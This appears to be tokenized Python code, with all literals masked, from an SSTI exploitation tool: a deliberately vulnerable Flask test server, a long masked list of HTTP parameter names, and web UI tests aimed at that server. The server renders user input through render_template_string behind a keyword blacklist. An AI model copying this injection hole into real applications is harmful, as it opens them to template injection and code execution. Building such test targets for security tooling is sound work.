'<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] <EOL> for i in bl : <EOL> if i in name : <EOL> return str ( '<STR_LIT>' ) <EOL> two_bracket_pattern = r"<STR_LIT>" <EOL> two_bracket_match = re . search ( two_bracket_pattern , name ) <EOL> bracket_comma_bracket_pattern = r"<STR_LIT>" <EOL> bracket_comma_bracket_match = re . search ( bracket_comma_bracket_pattern , name ) <EOL> bracket_bracket_line_pattern = r"<STR_LIT>" <EOL> bracket_bracket_line_match = re . search ( bracket_bracket_line_pattern , name ) <EOL> comma_bracket_bracket_line_pattern = r"<STR_LIT>" <EOL> comma_bracket_bracket_line_match = re . search ( comma_bracket_bracket_line_pattern , name ) <EOL> pattern_mo = r"<STR_LIT>" <EOL> matche_mo = re . search ( pattern_mo , name ) <EOL> if two_bracket_match : <EOL> if bracket_comma_bracket_match . group ( <NUM_LIT> ) : <EOL> print ( "<STR_LIT>" + name ) <EOL> return str ( '<STR_LIT>' ) <EOL> elif comma_bracket_bracket_line_match : <EOL> print ( "<STR_LIT>" + name ) <EOL> return str ( '<STR_LIT>' ) <EOL> elif bracket_bracket_line_match : <EOL> print ( "<STR_LIT>" + name ) <EOL> return str ( '<STR_LIT>' ) <EOL> else : <EOL> print ( "<STR_LIT>" + name ) <EOL> return str ( '<STR_LIT>' ) <EOL> if matche_mo : <EOL> print ( "<STR_LIT>" + name ) <EOL> return str ( '<STR_LIT>' ) <EOL> a = render_template_string ( template % name ) <EOL> print ( "<STR_LIT>" + name ) <EOL> if "<STR_LIT>" in a : <EOL> return a + str ( '<STR_LIT>' ) <EOL> return a <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def robots ( ) : <EOL> return send_from_directory ( os . path . join ( app . root_path , '<STR_LIT>' ) , <EOL> '<STR_LIT>' , mimetype = '<STR_LIT>' ) <EOL> if __name__ == '<STR_LIT>' : <EOL> app . run ( host = '<STR_LIT>' , port = <NUM_LIT> , debug = False ) <EOL> </s>
<s> HTTP_PARAMS_LIST = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> </s>
<s> import sys <EOL> sys . path . append ( "<STR_LIT>" ) <EOL> import time <EOL> import threading <EOL> import unittest <EOL> import os <EOL> import requests <EOL> from fenjing import webui , const <EOL> WEBUI_URL = "<STR_LIT>" <EOL> VULUNSERVER_URL = os . environ . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> t = threading . Thread ( target = webui . main , kwargs = { "<STR_LIT>" : False } ) <EOL> t . daemon = True <EOL> t . start ( ) <EOL> time . sleep ( <NUM_LIT> ) <EOL> class TestWebui ( unittest . TestCase ) : <EOL> def __init__ ( self , * args , ** kwargs ) : <EOL> super ( ) . __init__ ( * args , ** kwargs ) <EOL> def test_index ( self ) : <EOL> resp = requests . get ( WEBUI_URL ) <EOL> self . assertEqual ( resp . status_code , <NUM_LIT> ) <EOL> self . assertIn ( "<STR_LIT>" , resp . text ) <EOL> def wait_for_task ( self , task_id , task_type , max_time = <NUM_LIT> ) : <EOL> start_time = time . perf_counter ( ) <EOL> while True : <EOL> time . sleep ( <NUM_LIT> ) <EOL> resp = requests . post ( <EOL> WEBUI_URL + "<STR_LIT>" 